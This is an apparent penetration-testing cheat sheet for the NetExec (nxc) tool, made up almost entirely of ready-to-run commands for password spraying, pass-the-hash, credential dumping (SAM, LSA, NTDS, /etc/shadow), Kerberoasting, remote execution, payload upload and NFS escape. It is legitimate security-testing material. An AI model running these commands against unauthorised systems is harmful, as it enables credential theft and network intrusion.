# NetExec Complete Reference

Full reference for NetExec (nxc) v1.5.1+ — the network service exploitation tool for assessing large networks.

## Installation

```bash
# pip (current - installed)
pip install netexec

# Docker
docker run -it --rm netexec/netexec nxc <protocol> <target>

# From source
pip install git+https://github.com/Pennyw0rth/NetExec.git
```

## General Syntax

```bash
nxc <protocol> <target(s)> [options]
```

### Target Formats
- Single IP: `10.0.0.1`
- IP range: `10.0.0.1-10.0.0.50`
- CIDR: `10.0.0.0/24`
- Hosts file: `targets.txt` (one per line)

### Credential Formats
```bash
-u username -p password           # Single cred
-u user1 user2 -p pass1 pass2     # Multiple (paired)
-u user.txt -p pass.txt           # From files (spray mode)
-u '' -p ''                        # Null session
-H HASH                            # NTLM hash (pass-the-hash)
--kerberos-ticket ticket.ccache    # Kerberos ticket
--kerberos-password password       # Kerberos password
--use-kcache                        # Use Kerberos cache
--aesKey AES_KEY                    # AES key authentication
```

### Global Options
```bash
--timeout SECONDS     # Connection timeout
--delay SECONDS        # Delay between hosts
--jitter SECONDS       # Random jitter
--no-progress          # Disable progress bar
--verbose / -v         # Verbose output
--debug / -d           # Debug output
--log LOGFILE          # Log to file
--database DB          # Database for results (SQLite)
--continue-on-success  # Continue after successful auth
--local-auth           # Local authentication (not domain)
--port PORT            # Custom port
--ssl                  # Force SSL
--ignore-opsec         # Ignore OPSEC warnings
```

---

## SMB Protocol (Port 445)

### Enumeration
```bash
nxc smb target -u '' -p ''                     # Null session test
nxc smb target -u '' -p '' --shares            # List shares (null)
nxc smb target -u '' -p '' --users             # List domain users
nxc smb target -u '' -p '' --groups            # List domain groups
nxc smb target -u '' -p '' --sessions          # Active sessions
nxc smb target -u '' -p '' --disks             # List disks
nxc smb target -u admin -p 'P@ss' --shares     # Authenticated share list
nxc smb target -u admin -p 'P@ss' --pass-pol   # Password policy
nxc smb target -u admin -p 'P@ss' --groups     # Domain groups
nxc smb target -u admin -p 'P@ss' --local-groups # Local groups
nxc smb target -u admin -p 'P@ss' --users       # Domain users
nxc smb target -u admin -p 'P@ss' --loggedon-users-filtered  # Active logons
```

### Authentication & Password Spraying
```bash
nxc smb target -u admin -p 'P@ssw0rd'          # Single auth
nxc smb target -u admin -H 'NTLM_HASH'          # Pass-the-hash
nxc smb 10.0.0.0/24 -u users.txt -p 'Spring2024!' # Password spray
nxc smb 10.0.0.0/24 -u admin -p passwords.txt  # Password brute
```

### Command Execution
```bash
nxc smb target -u admin -p 'P@ss' -x "whoami"             # cmd.exe
nxc smb target -u admin -p 'P@ss' -x "whoami" --exec-method smbexec
nxc smb target -u admin -p 'P@ss' -x "whoami" --exec-method atexec
nxc smb target -u admin -p 'P@ss' -x "whoami" --exec-method wmiexec
nxc smb target -u admin -p 'P@ss' -X "whoami"             # PowerShell
```

### Credential Harvesting
```bash
nxc smb target -u admin -p 'P@ss' --sam       # Dump SAM hashes
nxc smb target -u admin -p 'P@ss' --lsa       # Dump LSA secrets
nxc smb target -u admin -p 'P@ss' --ntds       # Dump NTDS (DC only)
nxc smb target -u admin -p 'P@ss' -M lsassy   # lsassy module
```

### Share Spidering
```bash
nxc smb target -u admin -p 'P@ss' --spider C$ --pattern password
nxc smb target -u admin -p 'P@ss' --spider C$ --regex "..*password.*"
```

### File Operations
```bash
nxc smb target -u admin -p 'P@ss' --get-file C$\\Windows\\Temp\\loot.txt /tmp/loot.txt
nxc smb target -u admin -p 'P@ss' --put-file /tmp/payload.exe C$\\Windows\\Temp\\payload.exe
```

### Vulnerability Scanning
```bash
nxc smb target -u '' -p '' -M enum_vulnerability  # Check multiple vulns
nxc smb target -u '' -p '' -M ms17-010             # EternalBlue check
```

### Other SMB Operations
```bash
nxc smb target -u admin -p 'P@ss' --check-laps     # Check LAPS
nxc smb target -u admin -p 'P@ss' --laps            # Read LAPS password
nxc smb target -u admin -p 'P@ss' --spooler         # Check print spooler
nxc smb target -u admin -p 'P@ss' --webdav           # Check WebDAV
nxc smb target -u admin -p 'P@ss' --whoami           # Current user context
nxc smb target -u admin -p 'P@ss' --change-pass old_pass new_pass  # Change password
```

### TGT Generation
```bash
nxc smb target -u admin -p 'P@ss' --generate-tgt tgt.ccache
nxc smb target -u admin -p 'P@ss' --generate-krb5conf krb5.conf
nxc smb target -u admin -p 'P@ss' --generate-hosts-file hosts.txt
```

---

## LDAP Protocol (Port 389/636)

### Authentication
```bash
nxc ldap target -u admin -p 'P@ss'
nxc ldap target -u admin -H 'NTLM_HASH'
nxc ldap target -u admin -p 'P@ss' --kerberos
```

### Enumeration
```bash
nxc ldap target -u admin -p 'P@ss' --users              # Domain users
nxc ldap target -u admin -p 'P@ss' --groups             # Domain groups
nxc ldap target -u admin -p 'P@ss' --query "(&(objectClass=user))" name sAMAccountName  # Custom query
nxc ldap target -u admin -p 'P@ss' --active-users       # Active users only
nxc ldap target -u admin -p 'P@ss' --admin-count        # Admin count users
nxc ldap target -u admin -p 'P@ss' --gmsa               # gMSA accounts
nxc ldap target -u admin -p 'P@ss' --gmsa-extract       # Extract gMSA secrets
nxc ldap target -u admin -p 'P@ss' --subnet             # Extract subnets
nxc ldap target -u admin -p 'P@ss' --find-domain-sid    # Domain SID
nxc ldap target -u admin -p 'P@ss' --machine-account-quota  # MachineAccountQuota
nxc ldap target -u admin -p 'P@ss' --user-desc          # User descriptions
nxc ldap target -u admin -p 'P@ss' --scriptpath         # Login scripts
nxc ldap target -u admin -p 'P@ss' --pso                # Fine-grained password policies
nxc ldap target -u admin -p 'P@ss' --sccm               # SCCM enumeration
nxc ldap target -u admin -p 'P@ss' --entra-id            # Entra ID enumeration
```

### Kerberos Attacks
```bash
nxc ldap target -u '' -p '' --asreproast asreproast.txt      # ASREPRoast
nxc ldap target -u admin -p 'P@ss' --kerberoasting kerberoast.txt  # Kerberoast
nxc ldap target -u admin -p 'P@ss' --find-delegation         # Find delegation
nxc ldap target -u admin -p 'P@ss' --unconstrained-delegation # Unconstrained delegation
nxc ldap target -u admin -p 'P@ss' --pre2k                   # Pre2K computer accounts
```

### ADCS
```bash
nxc ldap target -u admin -p 'P@ss' --esc8                    # ESC8 abuse
nxc ldap target -u admin -p 'P@ss' --adcs                     # Enumerate CAs
```

### Domain Trusts
```bash
nxc ldap target -u admin -p 'P@ss' --dc-list                  # List DCs
nxc ldap target -u admin -p 'P@ss' --trusted-domains          # Domain trusts
nxc ldap target -u admin -p 'P@ss' --raisechild               # Raisechild abuse
nxc ldap target -u admin -p 'P@ss' --unsecure-dns-zones       # Unsecure DNS zones
```

### Security Checks
```bash
nxc ldap target -u admin -p 'P@ss' --check-ldap-signing       # LDAP signing
nxc ldap target -u admin -p 'P@ss' --dacl                     # Read DACL rights
```

### BloodHound Integration
```bash
nxc ldap target -u admin -p 'P@ss' --bloodhound               # BloodHound ingestor
nxc ldap target -u admin -p 'P@ss' --bloodhound-collection All # Full collection
```

---

## WinRM Protocol (Port 5985/5986)

```bash
nxc winrm target -u admin -p 'P@ss'                           # Auth test
nxc winrm target -u admin -p 'P@ss' -x "whoami /all"          # CMD execution
nxc winrm target -u admin -p 'P@ss' -X "Get-Process"          # PowerShell execution
nxc winrm target -u admin -p 'P@ss' --check-laps               # Check LAPS
nxc winrm target -u admin -p 'P@ss' -M module_name            # Run module
nxc winrm 10.0.0.0/24 -u users.txt -p 'Spring2024!'           # Password spray
```

---

## SSH Protocol (Port 22)

```bash
nxc ssh target -u root -p 'password'                          # Auth test
nxc ssh target -u root -p 'password' -x "id"                  # Command execution
nxc ssh target -u root --ssh-key /path/to/key                  # Key auth
nxc ssh target -u root -p 'password' --get-file /etc/shadow /tmp/shadow  # Download
nxc ssh target -u root -p 'password' --put-file /tmp/script.sh /tmp/script.sh  # Upload
nxc ssh 10.0.0.0/24 -u root -p passwords.txt                  # Password spray
```

---

## MSSQL Protocol (Port 1433)

```bash
nxc mssql target -u sa -p 'P@ss'                               # Auth test
nxc mssql target -u sa -p 'P@ss' --enum                        # Enumeration
nxc mssql target -u sa -p 'P@ss' -x "xp_cmdshell 'whoami'"    # Command via xp_cmdshell
nxc mssql target -u sa -p 'P@ss' -q "SELECT * FROM sys.databases"  # SQL query
nxc mssql target -u sa -p 'P@ss' --mssql-privesc              # Privilege escalation
nxc mssql target -u sa -p 'P@ss' --links                       # Linked servers
nxc mssql target -u sa -p 'P@ss' --rid-brute                   # RID brute force
nxc mssql target -u sa -p 'P@ss' --put-file /tmp/payload.exe C:\\Windows\\Temp\\payload.exe  # Upload
nxc mssql target -u sa -p 'P@ss' --get-file C:\\Windows\\Temp\\loot.txt /tmp/loot.txt  # Download
```

---

## RDP Protocol (Port 3389)

```bash
nxc rdp target -u admin -p 'P@ss'                              # Auth test
nxc rdp target --screenshot                                     # Screenshot (connected)
nxc rdp target --screenshot --nla                               # Screenshot without NLA
nxc rdp target -u admin -p 'P@ss' -x "cmd.exe /c whoami"      # Command execution
nxc rdp 10.0.0.0/24 -u users.txt -p 'Spring2024!'              # Password spray
```

---

## FTP Protocol (Port 21)

```bash
nxc ftp target -u anonymous -p ''                               # Anonymous login
nxc ftp target -u admin -p 'P@ss'                               # Auth test
nxc ftp target -u admin -p 'P@ss' --list                        # List files
nxc ftp target -u admin -p 'P@ss' --get remote.txt /tmp/local.txt  # Download
nxc ftp target -u admin -p 'P@ss' --put /tmp/local.txt remote.txt  # Upload
```

---

## WMI Protocol (Port 135)

```bash
nxc wmi target -u admin -p 'P@ss'                               # Auth test
nxc wmi target -u admin -p 'P@ss' -x "whoami"                  # Command execution
nxc wmi 10.0.0.0/24 -u users.txt -p 'Spring2024!'              # Password spray
```

---

## NFS Protocol (Port 2049)

```bash
nxc nfs target --enum                                           # Enumerate exports
nxc nfs target --share /export/data                             # Browse share
nxc nfs target --download /export/data/secret.txt /tmp/secret.txt  # Download
nxc nfs target --upload /tmp/payload.sh /export/data/payload.sh  # Upload
nxc nfs target --escape                                         # Escape to root FS
```

---

## VNC Protocol (Port 5900+)

```bash
nxc vnc target                                                  # Auth test
nxc vnc target -p 'password'                                    # Password auth
```

---

## Modules

### Listing Modules
```bash
nxc smb -L                   # List all SMB modules
nxc winrm -L                  # List all WinRM modules
nxc ldap -L                   # List all LDAP modules
```

### Using Modules
```bash
nxc smb target -u admin -p 'P@ss' -M module_name
nxc smb target -u admin -p 'P@ss' -M module_name --options   # View options
nxc smb target -u admin -p 'P@ss' -M module_name -o KEY=value  # Set options
nxc smb target -u admin -p 'P@ss' -M mod1 -M mod2 -M mod3   # Run multiple modules
```

### Key Modules

| Protocol | Module | Purpose |
|----------|--------|---------|
| SMB | `enum_vulnerability` | Check for known vulnerabilities |
| SMB | `ms17-010` | EternalBlue check |
| SMB | `lsassy` | Credential extraction |
| SMB | `spooler` | Print spooler check |
| SMB | `iis` | IIS configuration |
| SMB | `winscp` | WinSCP credential extraction |
| SMB | `drop-sc` | Drop scheduled task |
| SMB | `hash-spider` | Credential spidering |
| WinRM | `enum_av` | Antivirus enumeration |
| WinRM | `exec_cmd` | Enhanced command execution |

---

## Database & Logging

```bash
# Use database for results
nxc smb target -u admin -p 'P@ss' --database nxc.db

# BloodHound integration
nxc ldap target -u admin -p 'P@ss' --bloodhound -c All -d domain.local

# Audit mode (passive only)
nxc smb target -u admin -p 'P@ss' --audit

# Log results
nxc smb target -u admin -p 'P@ss' --log results.log
```

## VAPT Integration Patterns

### Full Windows/AD Assessment Chain
```bash
# 1. Discover Windows hosts
nxc smb 10.0.0.0/24 -u '' -p ''

# 2. Null session enumeration
nxc smb target -u '' -p '' --shares --users --groups

# 3. Authenticated enumeration
nxc smb target -u admin -p 'P@ss' --shares --pass-pol --loggedon-users-filtered

# 4. LDAP deep enumeration
nxc ldap target -u admin -p 'P@ss' --users --groups --asreproast asrep.txt --kerberoasting kerb.txt --find-delegation

# 5. Credential harvesting
nxc smb target -u admin -p 'P@ss' --sam --lsa

# 6. Command execution
nxc smb target -u admin -p 'P@ss' -x "whoami /all"
nxc winrm target -u admin -p 'P@ss' -X "Get-ADUser -Filter *"

# 7. Lateral movement
nxc smb 10.0.0.0/24 -u admin -H 'NTLM_HASH' --shares
```

### Linux/Unix Assessment Chain
```bash
# 1. SSH discovery
nxc ssh 10.0.0.0/24 -u root -p '' 

# 2. Authenticated SSH
nxc ssh target -u root -p 'password' -x "cat /etc/shadow"
nxc ssh target -u root -p 'password' -x "cat /etc/passwd"

# 3. NFS enumeration
nxc nfs target --enum
nxc nfs target --escape  # Try escaping to root FS
```